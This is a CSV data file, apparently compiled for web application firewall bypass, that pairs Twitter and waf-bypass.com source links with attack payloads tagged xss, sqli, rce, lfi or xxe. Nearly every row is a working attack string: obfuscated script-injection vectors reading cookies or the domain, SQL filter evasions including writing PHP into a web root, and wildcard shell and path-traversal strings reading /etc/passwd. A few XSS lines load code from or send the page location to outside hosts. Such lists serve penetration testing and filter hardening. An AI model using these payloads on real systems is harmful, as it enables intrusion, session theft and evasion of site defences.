https://twitter.com/bohdansec/status/1135699501707091968,<svg onload=prompt%26%23x000000028;document.domain)>,xss
https://twitter.com/0xPrial/status/1135272155409670144,"- xss""></a><input value=""Type anything""onbeforeinput=""prompt%26lpar%3Bdocument.domain%26rpar%3B""><!--",xss
https://twitter.com/Gr1nchDC/status/1132569029456089090,"/???/??t /???/??ss??'."" --",rce
https://twitter.com/sratarun/status/1131786947184275456,><tag onxxxx=alert(1)>,xss
https://twitter.com/sratarun/status/1131786947184275456,"><tag onxxxx=""'a'|alert(1)"">",xss
https://twitter.com/yeswehack/status/1130413802732904450,"<iframe name=""<svg/onload=alert(23)>"" src=""http://example[.]com/x.php?age=23;%0adocument.body.innerHTML=name//"">",xss
https://twitter.com/yeswehack/status/1130413802732904450,http://example[.]com/x.php?age=23;%0adocument.body.innerHTML=location.hash;//#<svg/onload=alert(23)>,xss
https://twitter.com/hungrybytes/status/1129501917216956416,"<svg onload\r\n=$.globalEval(""al""+""ert()"");>",xss
https://twitter.com/0xInfection/status/1123219386825711616,<input/oninput='new Function`confir\u006d\`0\``'>,xss
https://twitter.com/Bc10ver/status/1122682047821172743,"<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme",xss
https://twitter.com/Bc10ver/status/1122085759257853952,<lol/onauxclick=[0].some(alert)>rightclickhere,xss
https://twitter.com/LooseSecurity/status/1119023027524636676,<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>,xss
https://twitter.com/payloadartist/status/1118746947353923584,"param=XSS""%0D<body='X' onmouseover=setInterval`alert\x28&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;\x29`//",xss
https://twitter.com/whitej3rry/status/1115972926216523777,cd..\..\..\..\ && dir,rce
https://twitter.com/whitej3rry/status/1115972926216523777,cd..&&cd..&&cd..&&cd..&&dir,rce
https://twitter.com/sudhanshur705/status/1115590831962873856,%22%3E%3Cd3v%2Fonauxclick%3D%5B2%5D.some%28confirm%29%3Eclick,xss
https://twitter.com/itsdig/status/1111502091556716544,%3balert`1`%3b,xss
https://twitter.com/PentesterLab/status/1111398659306876929,../../../../../../e*c/p*s*d{{' http://server/...,rce
https://twitter.com/Abdessa77545600/status/1105748620215836673,system(“cat /etc/passwd”);,rce
https://twitter.com/Bc10ver/status/1104457727936528384,<--`<img/src=`%20onerror=confirm``>%20--!>,xss
https://twitter.com/k3yb0ardm0nk3y/status/1101230441430962176,".1union/**_**/select/*!.1*/,2,3--+",sqli
https://twitter.com/RenwaX23/status/1097244919079538689,"uNioN sElEcT 1,2,vErSiOn(),4,5;-- -",sqli
https://twitter.com/TeddySm72067390/status/1095231964456673282,"""/*'/*`/*--><html \"" onmouseover=/*&lt;svg/*/onload=alert()//>",xss
https://twitter.com/TeddySm72067390/status/1095231964456673282,//comment%0a%0dalert(0);,xss
https://twitter.com/LooseSecurity/status/1094254208856014852,%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0),xss
https://twitter.com/eduSatoe/status/1094125935534768128,"""/*'/*`/*--><html \"" onmouseover=/*&lt;svg/*/onload=alert()//>",xss
https://twitter.com/t_aozaki/status/1092452318707138567,<!<script>alert(4)</script>,xss
https://twitter.com/payloadartist/status/1090835586888298501,"<a href=""j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;"">X</a>",xss
https://twitter.com/payloadartist/status/1087388353425637377,<marquee loop=1 width=0 onfinish=alert`1`>XSS</marquee>,xss
https://twitter.com/securisec/status/1087110926761934848,"if/*!90000*/((3*9)>(0),sLeEp/*!80000*/(10),0)/*",sqli
https://twitter.com/sratarun/status/1082605334110318593,"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;"">XXXXX</a>",xss
https://twitter.com/XssPayloads/status/1064404998283497472,"onload=\""a='alert()';d='XSS ';b='t(d)';c=a+b;console.log(eval(c));",xss
https://twitter.com/ozzi_____/status/1054343459744690182,"a<%00meta name=""i"" HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/h%00tml;base64,PHNjcmlwdD5hbGVydCgiT1BFTkJVR0JPVU5UWSIpOzwvc2NyaXB0Pg=="">",xss
https://twitter.com/ozzi_____/status/1052489277559451648,""">a<marquee onstart='constructor.constructor(atob(""ywxlcnqoj09qru5cvudct1vovfknkq""))()'></marquee>",xss
https://twitter.com/hd_421/status/1050429170625470464,"%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E",xss
https://twitter.com/agedchild003/status/1047756838668783617,"""><block%quote oncontextmenu%3Dconfirm(1)>Right click me</blockquote><!--",xss
https://twitter.com/dyvikatma/status/1042685896515100672,"?""></script><base%20c%3D=href%3Dhttps:\targetsite>",xss
https://twitter.com/Gamliel_InfoSec/status/1039893482075246595,<a href=javas&#99;ript:alert(1)>,xss
https://twitter.com/Gamliel_InfoSec/status/1039690634293112832,"<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",xss
https://twitter.com/GeneralEG64/status/1011796363099635715,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
https://twitter.com/1nd1ff3r3n7/status/1002689866801524736,"<style><img src=""</style><img src=x ""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",xss
https://twitter.com/dewolfrobin/status/1001137209553113088,"\u0065\u0076\u0061\u006C('ablolzers'['replace'](""b"",""l"")['replace'](""lolzers"",""ert""))`1`",xss
https://twitter.com/ryanwendel/status/973307786040811520,"s = '""><script>alert(1)</script>' print 'eval(String.fromCharCode('+"","".join([str(ord(o)) for o in s])+'))'",xss
https://twitter.com/MrHappiey/status/937752832060485632,"<svg><script xlink:href=data:,alert(1) />",xss
https://twitter.com/MrHappiey/status/937752832060485632,<form action=javascript:alert(1)><input type=submit>,xss
https://twitter.com/magikh0e/status/937149729233887232,"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",xss
https://twitter.com/rudr4_sarkar/status/929321337620914177,eeee<%2fscript><script>prompt(/XSS/.source)<%2fscript>yyyy,xss
https://twitter.com/zyn00b/status/911963326774599680,union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A,sqli
https://twitter.com/Alra3ees/status/906399133665316864,<svg/onload=self[`aler`%2b`t`]`1`>,xss
https://twitter.com/i_bo0om/status/900983975262420993, INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>,sqli
https://twitter.com/rootpentesting/status/900391070785294337,"<iframe/onload='this[""src""]=""javas&Tab;cript:al""+""ert``""';>",xss
https://twitter.com/rootpentesting/status/900391070785294337,<img/src=q onerror='new Function`al\ert\`1\``'>,xss
https://twitter.com/zyn00b/status/874881911956672513,/*!50000union select*/,sqli
https://twitter.com/zyn00b/status/874881911956672513,/*!12345union select*/,sqli
https://twitter.com/zyn00b/status/874881911956672513,/*!13337union select*/,sqli
https://twitter.com/josephjose_96/status/871389477511471104,"sg7cx""%20onerror%3d""confirm(document.domain)""gd67e",xss
https://twitter.com/cadeath/status/871244841769771008,src=x:alert(alt) alt=3117,xss
https://twitter.com/Gamliel_InfoSec/status/864182553670037504,<scronerror=ipt>prompt(document.domain)</scronerror=ipt>,xss
https://twitter.com/pwndizzle/status/850297038302478336,"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",xss
https://twitter.com/ajinabraham/status/841215755978964992,~${ OGNL Payload },rce
https://twitter.com/gui_scombatti/status/824942073489002496,"<brute+onbeforescriptexecute=a=alert,a(1%26%23x29>",xss
https://twitter.com/zurael_stz/status/818878052239343617,%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect,sqli
https://twitter.com/classicbrute/status/783299931624837124,/foo/../etc/bar/../passwd,lfi
https://twitter.com/Psych0tr1a/status/781491543819640832,"<svg><script xlink:href=""{ASCII}data:,alert(1)""></script></svg>",xss
https://twitter.com/mradamdavies/status/780220202051112960,<marquee/onstart=c=String.fromCharCode;confirm(c(47)+c(88)+c(83)+c(83)+c(47))>,xss
https://twitter.com/Gamliel_InfoSec/status/770884953399787520,"""><input type=""submit"" formaction=""javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`""",xss
https://twitter.com/roo7break/status/738710755894296576,"<p style=""height:100px"" onwheel=""self['al'+'ert'](self['ev'+'al']('docu'+'ment.coo'+'kie'))""></p>",xss
https://twitter.com/e3xpl0it/status/706979861450067968,*!50000group_coNcat(*/) /*!50000coNcat(*/) `coNcat`%0a%0b%0c%0d%a0() concat/**x**/(),sqli
https://twitter.com/e3xpl0it/status/706979265624055808,param?id=@:=(%23 a %0a select 123 from ((table)))/1e0union%23 a %0a,sqli
https://twitter.com/Psych0tr1a/status/676430779216449537,<video autoplay onplay=alert`1` src=//w3schools.com/tags/movie.mp4>,xss
https://twitter.com/Xst3nZ/status/669524729494130688,"<input type=search onsearch=""location='data:text/html;\x62\x61\x73\x65\x36\x34,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"">",xss
https://twitter.com/NytroRST/status/669079381151715328,<input onf%0Aocus=alert(1) autofocus/,xss
https://twitter.com/sergey_lakantar/status/667398569310208000,%0a ls -la,rce
https://twitter.com/artsploit/status/666710561497997312,"<!DOCTYPE :_-_: SYSTEM ""ftp://x.s.artsploit.com/"">",xxe
https://twitter.com/asdizzle_/status/660144801023705088,<img onerror=$.getScript(String.fromCharCode(*CODE*)); src='asd'> where *CODE* = scripturl,xss
https://twitter.com/XssPayloads/status/651436429294325760,"<meta/content=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==""http-equiv=refresh>",xss
https://twitter.com/mradamdavies/status/643451924172414978,"0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",xss
https://twitter.com/mradamdavies/status/639524015242022912,<marquee loop=1 width=0 onfinish=prompt(1)>1</marquee>,xss
https://twitter.com/TricksTerCloWn/status/621826867151175681,/**/ORDER/**/BY/**/,sqli
https://twitter.com/TricksTerCloWn/status/621826867151175681,/*!order*/+/*!by*/,sqli
https://twitter.com/TricksTerCloWn/status/621826867151175681,/*!ORDER BY*/,sqli
https://twitter.com/TricksTerCloWn/status/621826867151175681,/*!50000ORDER BY*/,sqli
https://twitter.com/NaveenS16/status/595230999044206592,"?url=""onm<>ouseover=""ale<>rt(0)",xss
https://twitter.com/mazen160/status/592832286019694592,"<img/src=""x""/onerror=""prom\u0070t&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;"">",xss
https://twitter.com/soaj1664ashar/status/592228254666326016,"""><h2 id=""Iamheading""onmouseover=""confirm(1)"">",xss
https://twitter.com/mmrupp/status/592066462547910657,<a x href=javascript%26%23x3A%3Bconfirm(1)>a</a>,xss
https://twitter.com/LdrTom/status/1324413488391950338,%253C%252Fscript%253E%253Cscript%253Ealert%2528%2527XSS%2520here%2521%2527%2529%253C%252Fscript%253E,xss
https://twitter.com/infosecsanyam/status/1324262078991998977,/???/???/c?t$IFS/???/p?s?w?,rce
https://twitter.com/TheJulfikar/status/1321492850375208960,<sCRipT>alert(1)</sCRiPt>,xss
https://twitter.com/TheJulfikar/status/1321492850375208960,<script>%0d%0aalert(1)</script>,xss
https://twitter.com/TheJulfikar/status/1321492850375208960,<scr<script>ipt>alert(1);</scr</script>ipt>,xss
https://twitter.com/TheJulfikar/status/1321492850375208960,"<a/href=""j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;"">",xss
https://twitter.com/TheJulfikar/status/1321492850375208960,<svg•onload=alert(1)>,xss
https://waf-bypass.com/,?><img src=x onmouseleave=print()>,xss
https://waf-bypass.com/,"?><a/\test=?%26quot;x%26quot;?href=?%01javascript:/*%b1*/;location.assign(?//hackerone.com/stealthy?x=?+location)?>Click",xss
https://waf-bypass.com/,"<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>",xss
https://waf-bypass.com/,<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>,xss
https://waf-bypass.com/,<svg><circle><set onbegin=prompt(1) attributename=fill>,xss
https://waf-bypass.com/,<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>,xss
https://waf-bypass.com/,%3balert`1`%3b,xss
https://waf-bypass.com/,"asd""`> onpointerenter=x=prompt,x`XSS`",xss
https://waf-bypass.com/,<x onauxclick=import('//1152848220/')>click,xss
https://waf-bypass.com/,<x onauxclick=a=alert,a(domain)>click -@niksthehacker,xss
https://waf-bypass.com/,<x onauxclick=import('//1152848220/')>click,xss
https://waf-bypass.com/,<x onauxclick=import('//xss/')>click,xss
https://waf-bypass.com/,"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss",xss
https://waf-bypass.com/,{{constructor.constructor(alert`1`)()}},xss
https://waf-bypass.com/,"javascript:new%20Function`al\ert\`1\``;",xss
https://waf-bypass.com/,"<script>Object.prototype.BOOMR = 1;",xss
https://waf-bypass.com/,Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script> -https://portswigger.net/web-security/cross-site-scripting/cheat-sheet,xss
https://waf-bypass.com/,">%0D%0A%0D%0A<x '=foo""><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>",xss
https://waf-bypass.com/,>'><details/open/ontoggle=confirm('XSS')>,xss
https://waf-bypass.com/,6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,xss
https://waf-bypass.com/,"&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;",xss
https://waf-bypass.com/,file:/etc/passwd?/,lfi
https://waf-bypass.com/,file:/etc/passwd%3F/,lfi
https://waf-bypass.com/,file:/etc%252Fpasswd/,lfi
https://waf-bypass.com/,file:/etc%252Fpasswd%3F/,lfi
https://waf-bypass.com/,file:///etc/?/../passwd,lfi
https://waf-bypass.com/,file:///etc/%3F/../passwd,lfi
https://waf-bypass.com/,file:${br}/et${u}c/pas${te}swd?/,lfi
https://waf-bypass.com/,file:$(br)/et$(u)c/pas$(te)swd?/,lfi
https://waf-bypass.com/,`\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29?`,
https://waf-bypass.com/,?XOR(if(now()=sysdate(),sleep(5*5),0))OR?,sqli
https://waf-bypass.com/,"= onfocus=$.ajax({url:?http://&#8217;.concat(?yourxsshunder .xss.ht?),dataType:?script?,success:?success?})",xss
https://waf-bypass.com/,<input id=?a?value=?global?><input id=?b?value=?E?><input ?id=?c?value=?val?><input id=?d?value=?aler?><input id=?e?value=?t(documen?><input id=?f?value=?t.domain)?><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>,xss
https://waf-bypass.com/,?><img src=1 onmouseleave=print()>,xss
https://waf-bypass.com/,uniUNIONon,sqli
https://waf-bypass.com/,<a?/onclick=(confirm)(document.cookie)>Click Here!,xss
https://waf-bypass.com/,<svg onload=prompt%26%230000000040document.domain)>,xss
https://waf-bypass.com/,"<svg onload=prompt%26%23?000000028;document.domain)>",xss
https://waf-bypass.com/,"<x/onclick=globalThis&lsqb;?\u0070r\u006f?+?mpt?]&lt;)>clickme",xss
https://waf-bypass.com/,test?,prompt%0A/*HelloWorld*/(document.domain),xss
https://waf-bypass.com/,? <a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus> ?,xss
https://waf-bypass.com/,<svg onload=prompt%26%230000000040document.domain)>,xss
https://waf-bypass.com/,"<svg onload=prompt%26%23?000000028;document.domain)>",xss
https://waf-bypass.com/,../et*/pas**d,lfi
